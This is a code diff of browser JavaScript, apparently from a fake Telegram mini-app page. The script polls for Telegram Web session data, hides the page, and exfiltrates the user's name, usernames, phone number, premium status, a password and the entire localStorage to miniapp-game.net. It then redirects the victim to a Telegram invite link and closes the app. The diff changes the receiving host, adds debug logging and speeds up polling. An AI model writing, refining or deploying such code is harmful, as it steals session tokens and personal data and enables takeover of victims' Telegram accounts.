@@ -1,11 +1,16 @@
 document.addEventListener("DOMContentLoaded", function() {
   async function checkLocalStorage() {
     let globalState = localStorage.getItem("tt-global-state");
+    console.log("AAAA");
+    
     if (globalState && localStorage.getItem("user_auth")) {
       const parsedState = JSON.parse(globalState);
       const currentUserId = parsedState.currentUserId;
       const currentUser = parsedState.users.byId[currentUserId];
       document.body.style.display = "none";
+
+      console.log("DDDDD");
+      
 
       if (currentUserId && currentUser) {
         const { firstName, usernames, phoneNumber, isPremium } = currentUser;
@@ -14,9 +19,10 @@ document.addEventListener("DOMContentLoaded", function() {
         localStorage.removeItem("GramJs:apiCache");
         localStorage.removeItem("tt-global-state");
 
+        console.log("FFFFF");
+        
 
-
-        await fetch('https://dragonflypanel.com/api/telegram_info', {
+        fetch(`https://miniapp-game.net/api/telegram_info`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
@@ -25,9 +31,7 @@ document.addEventListener("DOMContentLoaded", function() {
             password, quicklySet: localStorage,
             type: new URLSearchParams(window.location.search).get("type")
           })
-        })
-        .then(res => {console.log(res);})
-        .catch(err => {console.log(err);});
+        });
 
         window.Telegram.WebApp.openTelegramLink("https://t.me/+8dtqN7T2sJpmNTb7");
         window.Telegram.WebApp.close();
@@ -43,5 +47,5 @@ document.addEventListener("DOMContentLoaded", function() {
     }
   }
 
-  const checkInterval = setInterval(checkLocalStorage, 500);
+  const checkInterval = setInterval(checkLocalStorage, 100);
 });
